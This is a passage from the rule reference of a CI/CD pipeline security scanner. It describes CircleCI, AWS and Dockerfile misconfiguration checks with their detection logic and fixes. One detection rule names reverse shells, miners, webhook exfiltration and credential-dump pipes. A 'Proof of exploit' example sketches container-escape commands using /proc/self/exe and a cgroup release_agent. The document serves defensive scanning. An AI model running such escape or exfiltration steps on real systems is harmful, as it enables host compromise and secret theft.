**Recommendation.** Always specify `fingerprints:` when using `add_ssh_keys` to restrict which SSH keys are loaded into the job. A bare `add_ssh_keys` step loads ALL project SSH keys.

**Source:** [`CC-019`](../providers/circleci.md#cc-019) in the [CircleCI provider](../providers/circleci.md).

#### `CC-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-020 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`CC-020`](../providers/circleci.md#cc-020) in the [CircleCI provider](../providers/circleci.md).

#### `CC-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-021`](../providers/circleci.md#cc-021) in the [CircleCI provider](../providers/circleci.md).

#### `CC-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`CC-022`](../providers/circleci.md#cc-022) in the [CircleCI provider](../providers/circleci.md).

#### `CC-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-023`](../providers/circleci.md#cc-023) in the [CircleCI provider](../providers/circleci.md).

#### `CC-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-024 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Signing (``cosign sign``) binds identity to bytes; attestation (``cosign attest``) binds a structured claim about *how* the artifact was built. SLSA verifiers check the latter so consumers can enforce builder/source/parameter policies.

**Recommendation.** Add a ``run: cosign attest`` command against a ``provenance.intoto.jsonl`` statement, or use the ``circleci/attestation`` orb. CC-006 covers signing; this rule covers the build-provenance step SLSA Build L3 requires.

**Source:** [`CC-024`](../providers/circleci.md#cc-024) in the [CircleCI provider](../providers/circleci.md).

#### `CC-025`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-025 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** CircleCI's ``restore_cache`` falls through each listed key until it finds a hit. When one of those keys is derived from ``CIRCLE_BRANCH``, ``CIRCLE_TAG``, or ``CIRCLE_PR_*``, values an attacker can set by opening a PR, the attacker can plant a cache entry that a protected job later uses. Uses checksum-of-lockfile or a static version label instead.

**Recommendation.** Derive ``save_cache`` and ``restore_cache`` keys from values the attacker can't control, the lockfile checksum (``{{ checksum "package-lock.json" }}``) and the build variant, not ``{{ .Branch }}`` or ``${CIRCLE_PR_NUMBER}``. A PR-scoped branch can seed a poisoned cache entry that a later main-branch run restores as trusted.

**Source:** [`CC-025`](../providers/circleci.md#cc-025) in the [CircleCI provider](../providers/circleci.md).

#### `CC-026`: Config contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cc-026 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Fires on concrete indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, credential-dump pipes, history-erasure).

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any contexts/env vars the pipeline can reach, and audit recent CircleCI runs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).

#### `CC-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-027 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Complements CC-002 (script injection from untrusted context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`CC-027`](../providers/circleci.md#cc-027) in the [CircleCI provider](../providers/circleci.md).

#### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Complements CC-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`CC-028`](../providers/circleci.md#cc-028) in the [CircleCI provider](../providers/circleci.md).

#### `CC-029`: Machine executor image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-029 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** CC-003 covers Docker images declared under ``docker:`` blocks. It does not reach the machine executor, where the image is on ``machine.image``. A rolling tag (``current``, ``edge``, ``default``) pulls a fresh image whenever CircleCI publishes one, reintroducing the same supply-chain risk Docker-image pinning is designed to eliminate.

**Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.

**Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).

#### `CC-030`: Workflow job uses context without branch filter or approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-030 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** CircleCI contexts are the recommended way to store shared secrets, but binding a context to a job is only half of least-privilege, the other half is controlling *when* the binding activates. Unrestricted workflow entries with ``context:`` turn every branch push into a secret-read event.

**Recommendation.** Either add ``filters.branches.only: [<protected branches>]`` to restrict when the context-bound job runs, or require a ``type: approval`` job in ``requires:`` so a human gates the secret-carrying execution. Without either gate, every push to the project loads the context's secrets into an ephemeral runner where any compromised step can exfiltrate them.

**Source:** [`CC-030`](../providers/circleci.md#cc-030) in the [CircleCI provider](../providers/circleci.md).

#### `CCM-003`: CodeCommit trigger targets SNS/Lambda in a different account <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ccm-003 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** A repo trigger pointing at an SNS topic or Lambda in a different account fires under the receiving account's permissions on every push. Sometimes this is the intended shape (a centralized notifications account), but a cross-account fan-out from a compromised repo can drive actions in the receiving account that the source-account owner can't directly observe.

**Recommendation.** Move trigger targets into the same account as the repository or explicitly document the cross-account relationship. Cross-account triggers extend the blast radius of a repository compromise to whatever the target ARN can do.

**Source:** [`CCM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CD-001`: Automatic rollback on failure not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-001 }

**Evidences:** [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations, [`RC.RP-01`](#ctrl-rc-rp-01) The recovery portion of the incident response plan is executed once initiated.

**How this is detected.** Without ``autoRollbackConfiguration``, a CodeDeploy deployment that fails leaves the failed revision live until an operator notices. The default is opt-in, not opt-out, deployments fail-open, not fail-back.

**Recommendation.** Enable autoRollbackConfiguration with at least the DEPLOYMENT_FAILURE event so CodeDeploy automatically reverts to the last successful revision when a deployment fails.

**Source:** [`CD-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CD-003`: No CloudWatch alarm monitoring on deployment group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-003 }

**Evidences:** [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations, [`RS.MA-01`](#ctrl-rs-ma-01) The incident response plan is executed once an incident is declared.

**How this is detected.** Alarm-based rollback is what lets a canary configuration actually stop a bad deploy mid-flight. Without alarms wired into ``alarmConfiguration``, CodeDeploy's only signal that the deploy went wrong is the deployment-state machine itself, which doesn't notice an application-level regression. CD-002's canary work and this rule's alarm-based halt are paired.

**Recommendation.** Add CloudWatch alarms (e.g. error rate, 5xx count, latency p99) to the deployment group's alarmConfiguration. Enable automatic rollback on DEPLOYMENT_STOP_ON_ALARM to halt bad deployments.

**Source:** [`CD-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** The pipeline's S3 artifact store holds intermediate build outputs handed between stages. Default SSE-S3 (AES256) encrypts at rest but uses an AWS-owned key whose policy you can't scope. A customer-managed CMK gives the same key-policy + CloudTrail Decrypt-event audit story you'd apply to Lambda code, Secrets Manager, or any other build output.

**Recommendation.** Configure a customer-managed AWS KMS key as the encryptionKey for each artifact store. This enables key rotation, fine-grained access policies, and CloudTrail auditing of decrypt operations.

**Source:** [`CP-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-003`: Source stage using polling instead of event-driven trigger <span class="pg-sev pg-sev--low">LOW</span> { #detail-cp-003 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** ``PollForSourceChanges=true`` polls the source repo every minute or two. Beyond the API-quota and latency cost, polling produces a less-useful CloudTrail story than event-driven triggers. You see the poll calls, not the specific commit that started the pipeline. EventBridge / CodeCommit triggers tie each pipeline start to the originating event.

**Recommendation.** Set PollForSourceChanges=false and configure an Amazon EventBridge rule or CodeCommit trigger to start the pipeline on change. This reduces latency, API usage, and improves auditability.

**Known false positives.**

- ``PollForSourceChanges=true`` is the CFN default for CodeCommit sources, so legacy templates can carry the flag without an active design decision behind it. The rule is advisory (consider EventBridge / CodeStarSourceConnection) rather than a real risk; defaults to LOW confidence so CI gates default-filter it.

**Source:** [`CP-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-004`: Legacy ThirdParty/GitHub source action (OAuth token) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-004 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** The legacy ThirdParty/GitHub source-action provider stores a long-lived OAuth token in the pipeline's action configuration. The token has whatever scope the granting GitHub user has, never rotates, and isn't directly revocable from the AWS side. CodeConnections (formerly CodeStar Connections) replaces this with an AWS-managed connection that the GitHub user can revoke.

**Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.

**Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-007`: CodePipeline v2 PR trigger accepts all branches <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-007 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** V2 pipelines added native PR triggers; without a ``branches.includes`` filter, any PR, including fork PRs from outside the org, fires the pipeline. The build stage runs with whatever IAM authority the pipeline's role carries, which is the full attack surface a fork-PR compromise can reach.

**Recommendation.** On V2 pipelines, add an ``includes`` filter under the trigger's ``branches`` block (and optionally ``pullRequest.events``) so only PRs targeting specific branches run. Without a filter, any fork-PR can execute the pipeline's build and deploy stages.

**Source:** [`CP-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CT-001`: No active CloudTrail trail in region <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ct-001 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** CloudTrail is the only AWS-native source of record for management-plane API calls. A region with no active trail blinds incident responders: a pipeline compromise is invisible once the in-memory CloudWatch buffer rolls over.

**Recommendation.** Create a CloudTrail trail that logs management events in this region and start logging. Without a trail, CodeBuild/CodePipeline/IAM API activity, including credential changes during a compromise, has no durable audit record.

**Source:** [`CT-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CT-002`: CloudTrail log-file validation disabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ct-002 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored, [`DE.AE-03`](#ctrl-de-ae-03) Information is correlated from multiple sources.

**How this is detected.** CloudTrail logs are S3 objects. Without log-file validation, an attacker with ``s3:PutObject`` on the trail bucket can edit log files to remove evidence of their activity, and there's no digest to compare against. With validation on, every hour of logs is summarized in a signed digest file under ``CloudTrail-Digest/``.

**Recommendation.** Set ``LogFileValidationEnabled=true`` on every CloudTrail trail. Log validation produces a signed digest file alongside each log object so tampering by an attacker who also has S3 write access can be detected after the fact.

**Source:** [`CT-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CT-003`: CloudTrail trail is not multi-region <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ct-003 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** An attacker who knows your CloudTrail trail is regional deliberately operates from a different region. Multi-region trails capture management events from every region into a single trail, closing the gap without you having to enumerate which regions you actually use.

**Recommendation.** Convert the trail to a multi-region trail. A single-region trail misses activity in every other region, an attacker aware of the scope can drive reconnaissance or persistence from an unlogged region.

**Source:** [`CT-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CW-001`: No CloudWatch alarm on CodeBuild FailedBuilds metric <span class="pg-sev pg-sev--low">LOW</span> { #detail-cw-001 }

**Evidences:** [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Failure-rate signals are how on-call learns about an unfamiliar build crashing in a loop, an attacker probing the build environment, or a CI quota being exhausted. CloudWatch captures the ``FailedBuilds`` metric automatically, the alarm is the missing fan-out.

**Recommendation.** Create a CloudWatch alarm on the ``AWS/CodeBuild`` namespace ``FailedBuilds`` metric (aggregated or per-project). Without one, repeated build failures during a compromise, or a runaway fork-PR build, won't reach on-call.

**Source:** [`CW-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CWL-001`: CodeBuild log group has no retention policy <span class="pg-sev pg-sev--low">LOW</span> { #detail-cwl-001 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** CloudWatch Logs created by CodeBuild default to ``Never Expire`` retention. Build logs frequently echo secrets accidentally (a `set -x` script, an `env` dump in an error trace), so unbounded retention extends the exposure window for every secret a build has ever leaked. A short-but-finite retention also caps cost.

**Recommendation.** Set a retention policy on every ``/aws/codebuild/*`` log group. The default is 'Never Expire', which both racks up storage cost and keeps logs indefinitely past any compliance window.

**Source:** [`CWL-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CWL-002`: CodeBuild log group not KMS-encrypted <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cwl-002 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** CloudWatch Logs default encryption is service-managed, fine for confidentiality, but no audit trail or scoping. Build logs are a frequent secret-leak vector (CWL-001's rationale extended), so the same key-policy + Decrypt-event story you'd apply to S3 / Lambda / Secrets Manager is warranted here too.

**Recommendation.** Associate a customer-managed KMS key with every ``/aws/codebuild/*`` log group via ``associate-kms-key``. Logs often contain secret material accidentally echoed by builds; encrypting them with a CMK means the key policy controls who can read the logs, not just S3/CloudWatch IAM.

**Source:** [`CWL-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-002`: Container runs as root (missing or root USER directive) <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-002 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Multi-stage builds: only the final stage matters for runtime identity, since intermediate stages don't ship. The check scopes USER to the *last* FROM through end-of-file.

**Recommendation.** Add a ``USER <non-root>`` directive after package install steps (e.g. ``USER 1001`` or ``USER appuser``). Running as root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2019-5736](https://www.cve.org/CVERecord?id=CVE-2019-5736) (runC host breakout): a malicious container running as root could overwrite the host's runC binary and compromise every other container on the node. Non-root containers were not exploitable.
- [CVE-2022-0492](https://www.cve.org/CVERecord?id=CVE-2022-0492) (cgroups v1 escape via release_agent): root inside a container with CAP_SYS_ADMIN could write to the host's release_agent file and execute arbitrary host code. Containers running as a non-root UID side-stepped the exploit class entirely.

**Proof of exploit.**

# Vulnerable: image runs as root by default (no USER set).
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3
COPY app.py /app/
CMD ["python3", "/app/app.py"]

# Attack: when the container is breached (RCE in the app, a
# kernel CVE, a misconfigured mount), the attacker runs as
# UID 0. From there:
#
#   # CVE-2019-5736 path: overwrite /proc/self/exe to corrupt
#   # the host's runC binary — every container on the node
#   # the next launch executes attacker code on the host:
#   echo '#!/bin/sh\n/attacker_payload' > /proc/self/exe
#
#   # CVE-2022-0492 path: cgroup release_agent escape:
#   mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg
#   echo '/payload' > /tmp/cg/release_agent
#   echo 1 > /tmp/cg/notify_on_release
#
# A non-root UID makes both paths fail at the first syscall.

# Safe: drop to a dedicated unprivileged user.
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 \
  && useradd --uid 1001 --create-home app
COPY --chown=app:app app.py /app/
USER 1001
CMD ["python3", "/app/app.py"]

**Source:** [`DF-002`](../providers/dockerfile.md#df-002) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** ``ADD`` with a URL is the historical Dockerfile footgun: it fetches at *build* time over HTTP(S) with no checksum and no signature, and the registry tag does not pin the source. A tampered server or DNS hijack silently swaps the content. ``COPY`` is for local files; ``RUN curl + verify`` is for remote ones.

**Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.

**Known false positives.**

- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.

**Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).

**Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.

**Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-005`: RUN uses shell-eval (eval / sh -c on a variable / backticks) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-005 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.

**Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.

**Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-006`: ENV or ARG carries a credential-shaped literal value <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-006 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS keys outright (the literal AWS access-key shape) and credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal.

**Recommendation.** Never hard-code credentials in a Dockerfile. ``ENV`` values are baked into the image layer history, even if the value is later overwritten, ``docker history --no-trunc`` reads the original. Use ``RUN --mount=type=secret`` for build-time secrets or runtime env injection (``docker run -e SECRET=…``) for runtime ones. Rotate any secret already exposed.

**Source:** [`DF-006`](../providers/dockerfile.md#df-006) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-007`: No HEALTHCHECK directive declared <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-007 }

**Evidences:** [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** This is a defense-in-depth signal rather than an exploitation indicator, severity is LOW. A missing healthcheck doesn't create a vulnerability on its own, but downstream orchestrators (Kubernetes, ECS, Compose) cannot recover an unhealthy container they cannot detect, and that turns a soft failure (slow leak, deadlock) into a stale-process incident.

**Recommendation.** Declare a ``HEALTHCHECK`` so the orchestrator can detect stuck or zombie containers. Example: ``HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD curl -fsS http://localhost/healthz || exit 1``. Skip this for builder/multi-stage intermediate images, only the runtime image needs one.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-007`](../providers/dockerfile.md#df-007) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-008`: RUN invokes docker --privileged or escalates capabilities <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-008 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

